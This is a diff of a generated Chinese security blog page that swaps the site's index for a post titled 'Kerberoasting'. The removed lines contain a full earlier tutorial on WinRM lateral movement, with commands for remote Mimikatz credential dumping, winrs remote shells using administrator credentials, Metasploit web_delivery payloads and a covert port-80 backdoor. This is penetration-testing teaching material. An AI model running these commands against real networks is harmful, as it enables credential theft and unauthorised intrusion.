@@ -7,15 +7,26 @@
   
   
   
-  <title>林中小屋</title>
+  <title>Kerberoasting | 林中小屋</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="林中小屋">
-<meta property="og:url" content="http://example.com/index.html">
+  <meta name="description" content="0x01 简介​    Kerberoasting的概念 ​    Kerberoasting的原理 ​    Kerberoasting的实现 ​    Kerberoasting后门利用 0x02 基本概念一、SPN是什么:服务主题名称( SPN: Service Principal Names) 是服务实例， 可以将其理解为一个服务（比如HTTTP、MSSQL）的唯一标识符，服务在加入域中时">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Kerberoasting">
+<meta property="og:url" content="http://example.com/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/index.html">
 <meta property="og:site_name" content="林中小屋">
+<meta property="og:description" content="0x01 简介​    Kerberoasting的概念 ​    Kerberoasting的原理 ​    Kerberoasting的实现 ​    Kerberoasting后门利用 0x02 基本概念一、SPN是什么:服务主题名称( SPN: Service Principal Names) 是服务实例， 可以将其理解为一个服务（比如HTTTP、MSSQL）的唯一标识符，服务在加入域中时">
 <meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://example.com/images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927155830466.png">
+<meta property="og:image" content="http://example.com/images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927164313999.png">
+<meta property="og:image" content="http://example.com/images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927165832743.png">
+<meta property="og:image" content="http://example.com/images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927170102406.png">
+<meta property="og:image" content="http://example.com/images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210928100158925.png">
+<meta property="article:published_time" content="2021-09-27T07:22:39.000Z">
+<meta property="article:modified_time" content="2021-09-28T02:04:59.261Z">
 <meta property="article:author" content="Nayon|1163875625@qq.com">
+<meta property="article:tag" content="域渗透">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/images/Kerberoasting%E6%94%BB%E5%87%BB%E5%AD%A6%E4%B9%A0.assets/image-20210927155830466.png">
   
     <link rel="alternative" href="/atom.xml" title="林中小屋" type="application/atom+xml">
   
@@ -33,9 +44,6 @@
   <link rel="stylesheet" href="/font-awesome/css/font-awesome.min.css">
   <link rel="apple-touch-icon" href="/apple-touch-icon.png">
   
-    
-    
-  
   
       <link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
   
@@ -46,8 +54,8 @@
       var yiliaConfig = {
           fancybox: true,
           animate: true,
-          isHome: true,
-          isPost: false,
+          isHome: false,
+          isPost: true,
           isArchive: false,
           isTag: false,
           isCategory: false,
@@ -238,9 +246,7 @@
         </header>
     </div>
 </nav>
-      <div class="body-wrap">
-  
-    <article id="post-Kerberoasting攻击" class="article article-type-post" itemscope itemprop="blogPost">
+      <div class="body-wrap"><article id="post-Kerberoasting攻击" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
       <a  href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/" class="article-date">
@@ -257,13 +263,24 @@
       <header class="article-header">
         
   
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting</a>
+    <h1 class="article-title" itemprop="name">
+      Kerberoasting
     </h1>
   
 
 
       </header>
+      
+      <div class="article-info article-info-post">
+        
+
+        
+    <div class="article-tag tagcloud">
+        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
+    </div>
+
+        <div class="clearfix"></div>
+      </div>
       
     
     <div class="article-entry" itemprop="articleBody">
@@ -380,161 +397,153 @@
       
     </div>
     
-    <div class="article-info article-info-index">
-      
-      
-
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%9F%9F%E6%B8%97%E9%80%8F/" rel="tag">域渗透</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
   </div>
+  
+    
+    <div class="copyright">
+        <p><span>本文标题:</span><a  href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting</a></p>
+        <p><span>文章作者:</span><a  href="/" title="访问  的个人博客"></a></p>
+        <p><span>发布时间:</span>2021年09月27日 - 15时22分</p>
+        <p><span>最后更新:</span>2021年09月28日 - 10时04分</p>
+        <p>
+            <span>原始链接:</span><a class="post-url" href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/" title="Kerberoasting">http://example.com/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/</a>
+            <span class="copy-path" data-clipboard-text="原文: http://example.com/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/　　作者: " title=""></span>
+        </p>
+        <p>
+            <span>许可协议:</span><i class="fa fa-creative-commons"></i> <a rel="license noopener" target="_blank" href="http://creativecommons.org/licenses/by-nc-sa/3.0/cn/" title="中国大陆 (CC BY-NC-SA 3.0 CN)" target = "_blank">"署名-非商用-相同方式共享 3.0"</a> 转载请保留原文链接及作者。
+        </p>
+    </div>
+
+
+
+<nav id="article-nav">
+  
+  
+    <a  href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">WinRM-横向移动</div>
+      <strong class="article-nav-caption">></strong>
+    </a>
+  
+</nav>
+
+
   
 </article>
 
+    <div id="toc" class="toc-article">
+    <strong class="toc-title">文章目录</strong>
+    <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E7%AE%80%E4%BB%8B"><span class="toc-number">1.</span> <span class="toc-text">0x01 简介</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E5%9F%BA%E6%9C%AC%E6%A6%82%E5%BF%B5"><span class="toc-number">2.</span> <span class="toc-text">0x02 基本概念</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81SPN%E6%98%AF%E4%BB%80%E4%B9%88"><span class="toc-number">2.1.</span> <span class="toc-text">一、SPN是什么:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SPN%E5%88%86%E7%B1%BB"><span class="toc-number">2.2.</span> <span class="toc-text">SPN分类:</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81SPN%E6%A0%87%E5%87%86%E6%A0%BC%E5%BC%8F"><span class="toc-number">2.3.</span> <span class="toc-text">二、SPN标准格式</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%89%E3%80%81%E6%9F%A5%E8%AF%A2SPN"><span class="toc-number">2.4.</span> <span class="toc-text">三、查询SPN</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x03-Kerberoasting%E7%9A%84%E5%8E%9F%E7%90%86"><span class="toc-number">3.</span> <span class="toc-text">0x03 Kerberoasting的原理</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%B8%80%E3%80%81-Kerberos%E8%AE%A4%E8%AF%81%E8%BF%87%E7%A8%8B"><span class="toc-number">3.1.</span> <span class="toc-text">一、 Kerberos认证过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BA%8C%E3%80%81Windows%E7%B3%BB%E7%BB%9F%E9%80%9A%E8%BF%87SPN%E6%9F%A5%E8%AF%A2%E8%8E%B7%E5%BE%97%E6%9C%8D%E5%8A%A1%E5%92%8C%E6%9C%8D%E5%8A%A1%E5%AE%9E%E4%BE%8B%E8%B4%A6%E6%88%B7%E7%9A%84%E5%AF%B9%E5%BA%94%E5%85%B3%E7%B3%BB"><span class="toc-number">3.2.</span> <span class="toc-text">二、Windows系统通过SPN查询获得服务和服务实例账户的对应关系</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x04-Kerberoasting%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%96%B9%E6%B3%95%E4%B8%80"><span class="toc-number">4.</span> <span class="toc-text">0x04 Kerberoasting的实现方法一</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1%E3%80%81%E6%8B%BF%E5%88%B0%E6%9C%89%E4%BB%B7%E5%80%BC%E7%9A%84SPN"><span class="toc-number">4.1.</span> <span class="toc-text">1、拿到有价值的SPN</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3%E3%80%81%E8%AF%B7%E6%B1%82TGS%E7%A5%A8%E6%8D%AE"><span class="toc-number">4.2.</span> <span class="toc-text">3、请求TGS票据</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x06-Kerberoasting%E5%90%8E%E9%97%A8%E5%88%A9%E7%94%A8"><span class="toc-number">5.</span> <span class="toc-text">0x06 Kerberoasting后门利用</span></a></li></ol>
+</div>
+<style>
+    .left-col .switch-btn {
+        display: none;
+    }
+    .left-col .switch-area {
+        display: none;
+    }
+</style>
+<input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
+
+<script>
+    var valueHide = "隐藏目录";
+    var valueShow = "显示目录";
+    if ($(".left-col").is(":hidden")) {
+        $("#tocButton").attr("value", valueShow);
+    }
+    $("#tocButton").click(function() {
+        if ($("#toc").is(":hidden")) {
+            $("#tocButton").attr("value", valueHide);
+            $("#toc").slideDown(320);
+            $(".switch-btn, .switch-area").fadeOut(300);
+        }
+        else {
+            $("#tocButton").attr("value", valueShow);
+            $("#toc").slideUp(350);
+            $(".switch-btn, .switch-area").fadeIn(500);
+        }
+    })
+    if ($(".toc").length < 1) {
+        $("#toc, #tocButton").hide();
+        $(".switch-btn, .switch-area").show();
+    }
+</script>
 
 
 
 
+<div class="bdsharebuttonbox">
+	<a href="#" class="fx fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+	<a href="#" class="fx fa-weixin bds_weixin" data-cmd="weixin" title="分享到微信"></a>
+	<a href="#" class="fx fa-qq bds_sqq" data-cmd="sqq" title="分享到QQ好友"></a>
+	<a href="#" class="fx fa-facebook-official bds_fbook" data-cmd="fbook" title="分享到Facebook"></a>
+	<a href="#" class="fx fa-twitter bds_twi" data-cmd="twi" title="分享到Twitter"></a>
+	<a href="#" class="fx fa-linkedin bds_linkedin" data-cmd="linkedin" title="分享到linkedin"></a>
+	<a href="#" class="fx fa-files-o bds_copy" data-cmd="copy" title="分享到复制网址"></a>
+</div>
+<script>window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"2","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];</script>
 
 
 
 
-
-
-  
-    <article id="post-WinRM-横向移动" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a  href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" class="article-date">
-      <time datetime="2021-09-26T07:08:44.000Z" itemprop="datePublished">2021-09-26</time>
-</a>
-
-    </div>
-  
-  <div class="article-inner">
     
-      <input type="hidden" class="isFancy" />
+        <section class="changyan" id="comments">
+  <!--<div id="uyan_frame"></div>-->
+  <div id="SOHUCS"></div>
+  <script charset="utf-8" type="text/javascript" src="https://changyan.sohu.com/upload/changyan.js"></script>
+  <script type="text/javascript">
+    window.changyan.api.config({
+      appid: 'xxxx',
+      conf: 'xxxxxxxxx'
+    });
+  </script>
+</section>
     
-    
-      <header class="article-header">
+
+
+
+    <div class="scroll" id="post-nav-button">
         
-  
-    <h1 itemprop="name">
-      <a  class="article-title" href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">WinRM-横向移动</a>
-    </h1>
-  
-
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-          
-        <p><strong>WinRM 用于Windows远程管理，他允许管理员远程执行系统命令。通过HTTP(5985) 或 HTTPS SOAP(5986)进行执行，支持Kerberos以及NTLM身份验证以及基本身份验证。使用此服务需要管理员票据。</strong></p>
-<p>假设我们已经获得一台内网服务器的管理员权限(对端服务器允许此用户登陆即可)，并且开启了WinRM管理服务器，那么我们可以利用凭证进行内网横向移动</p>
-<p>开放端口5985的主机运行WInRM服务，可利用端口扫描工具进行探测确认。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sS -sV --open -p5985 <span class="number">10.10</span><span class="number">.10</span><span class="number">.10</span><span class="number">-12</span></span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926195057008.png" alt="image-20210926195057008"></p>
-<p>如果此时端口5985打开但端口5986已经被关闭，此时WinRM服务配置为仅接受HTTP连接，并加密</p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192658012.png" alt="image-20210926192658012"></p>
-<p>利用Poershell Invoke-Command 可通过WinRM服务执行命令。</p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192711834.png" alt="image-20210926192711834"></p>
-<p>同时我们还可利用 <strong>WinRM</strong> 远程执行Mimikatz来导出内存中的票据，无需将Mimikatz放入目标机器中执行。</p>
-<p>此处使用Mimikatz导出票据，前提条件是你已获得管理员权限，否则将会导出失败。</p>
-<figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Import-Module ./Invoke-Mimikatz.ps1</span><br><span class="line">Invoke-Mimikatz -ComputerName TARGET</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192725400.png" alt="image-20210926192725400"></p>
-<p>利用导出的凭证，继续横向渗透。</p>
-<p>对于不运行 <strong>WinRM</strong> 的系统，可以利用Powershell命令进行启用配置。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Enable-PSRemoting -Force</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192736459.png" alt="image-20210926192736459"></p>
-<p>默认情况下，可能无法通过 WinRM 连接到另一个系统， 并且可能需要额外的配置。 以下配置可能帮助我们解决配置错误问题。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Winrm quickconfig</span><br><span class="line">winrm set winrm/config/client @&#123;AllowUnencrypted = &quot;true</span><br><span class="line">Set-Item WSMan:localhost\client\trustedhosts -value *</span><br></pre></td></tr></table></figure>
-
-<h2 id="WinRs"><a href="#WinRs" class="headerlink" title="WinRs"></a>WinRs</h2><p>WinRS 是一个命令行工具，它是Windows 2008及更高版本的一部分。如果启用了WinRM,此实用程序可用于远程执行主机上的命令。在CMD参数上可建立一个新的远程cmd会话。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;cmd&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192758398.png" alt="image-20210926192758398"></p>
-<p>也可对其远程执行命令而非一个cmd会话，以便对目标远程探测</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://10.10.10.12:5985 -u:administrator -p:xxxxx &quot;net localgroup administrators&quot;</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192808642.png" alt="image-20210926192808642"></p>
-<p>也可利用msf 的 web_delivery模块远程无文件上线msf。此模块将生成一个将在本地托管的有效载荷，并将生成需要在目标上执行的powershell命令。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">use multi/script/web_delivery</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192818719.png" alt="image-20210926192818719"></p>
-<p><strong>利用winrs远程执行:</strong></p>
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192827384.png" alt="image-20210926192827384"></p>
-<h2 id="元破解"><a href="#元破解" class="headerlink" title="元破解"></a>元破解</h2><p>MSF 有几个模块，可用于发现开启了WinRM服务的主机、发现凭证以进行服务身份验证以及执行任意命令和代码。以下模块可以发现启用了WinRM 服务的系统机器支持的身份验证协议。</p>
-<h3 id="探测WinRM验证方式"><a href="#探测WinRM验证方式" class="headerlink" title="探测WinRM验证方式"></a>探测WinRM验证方式</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_auth_methods</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192845668.png" alt="image-20210926192845668"></p>
-<h3 id="探测票据有效性"><a href="#探测票据有效性" class="headerlink" title="探测票据有效性"></a>探测票据有效性</h3><p>如果已经获得服务器上的缓存票据，则这些票据可用于通过<strong>WinRM</strong>服务与其他主机进行身份验证。以下模块可检测票据是否对其他主机有效。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_login </span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192855464.png" alt="image-20210926192855464"></p>
-<h3 id="利用票据执行命令"><a href="#利用票据执行命令" class="headerlink" title="利用票据执行命令"></a>利用票据执行命令</h3><p>通过<strong>WinRM</strong> 服务执行任意命令。此模块需要本地管理员凭据、域和目标主机。</p>
-<p>此处未能成功执行。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/winrm/winrm_cmd</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192903042.png" alt="image-20210926192903042"></p>
-<p>也可利用WinRM和以下模块执行命令。该模块需要本地管理员凭证和代码将执行的主机列表。此模块可用于横向移动到域内主机。</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exploit/windows/winrm/winrm_script_exec</span><br></pre></td></tr></table></figure>
-
-<p><img src="/images/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8.assets/image-20210926192912391.png" alt="image-20210926192912391"></p>
-<h2 id="其他利用手段"><a href="#其他利用手段" class="headerlink" title="其他利用手段"></a>其他利用手段</h2><p>​    <strong>1.开启3389远程桌面控制</strong></p>
-<p>​    若开启了WinRM,可利用PeekABoo工具或直接对注册表操作开启3389端口</p>
-<p>​    <strong>2.端口复用做后门</strong></p>
-<p>​    将WInRM监听端口由5985改为80或443等常用端口，及时端口被Web服务占用也不会影响，并且不会影响web服务的执行：</p>
-<p>​    （1）配置目标WinRM服务，更改监听端口开启复用模式</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">winrm set winrm/config/Listener?Address=*+Transport=HTTP @&#123;Port=&quot;80&quot;&#125;</span><br><span class="line">winrm set winrm/config/service @&#123;EnableCompatibilityHttpListener=&quot;true&quot;&#125;</span><br></pre></td></tr></table></figure>
-
-<p>​    （2）链接目标</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">winrs -r:http://192.168.1.152 -u:administrator -p:xxxx cmd</span><br></pre></td></tr></table></figure>
-
-<p>​    此方法适用于存在web服务的主机，并不会再开启新端口，较为隐蔽。</p>
-
-      
+            <a  href="/" title="回到主页"><i class="fa fa-home"></i></a>
+        
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+        
+            <a  href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/" title="下一篇: WinRM-横向移动">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
     </div>
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2021/09/27/Kerberoasting%E6%94%BB%E5%87%BB/">Kerberoasting</a></li><li class="post-list-item"><a class="post-list-link" href="/2021/09/26/WinRM-%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8/">WinRM-横向移动</a></li></ul>
     
-    <div class="article-info article-info-index">
-      
-      
+<script src="https://7.url.cn/edu/jslib/comb/require-2.1.6,jquery-1.9.1.min.js"></script>
 
-      
-    <div class="article-tag tagcloud">
-        <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/" rel="tag">内网渗透</a></li></ul>
-    </div>
-
-      
-      <div class="clearfix"></div>
-    </div>
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
+    <script>
+        $(".post-list").addClass("toc-article");
+        // $(".post-list-item a").attr("target","_blank");
+        $("#post-nav-button > a:nth-child(2)").click(function() {
+            $(".fa-bars, .fa-times").toggle();
+            $(".post-list").toggle(300);
+            if ($(".toc").length > 0) {
+                $("#toc, #tocButton").toggle(200, function() {
+                    if ($(".switch-area").is(":visible")) {
+                        $("#toc, .switch-btn, .switch-area").toggle();
+                        $("#tocButton").attr("value", valueHide);
+                        }
+                    })
+            }
+            else {
+                $(".switch-btn, .switch-area").fadeToggle(300);
+            }
+        })
+    </script>
 
 
 
 
-  
-  
+    <script>
+        
+    </script>
 
 </div>
       <footer id="footer">
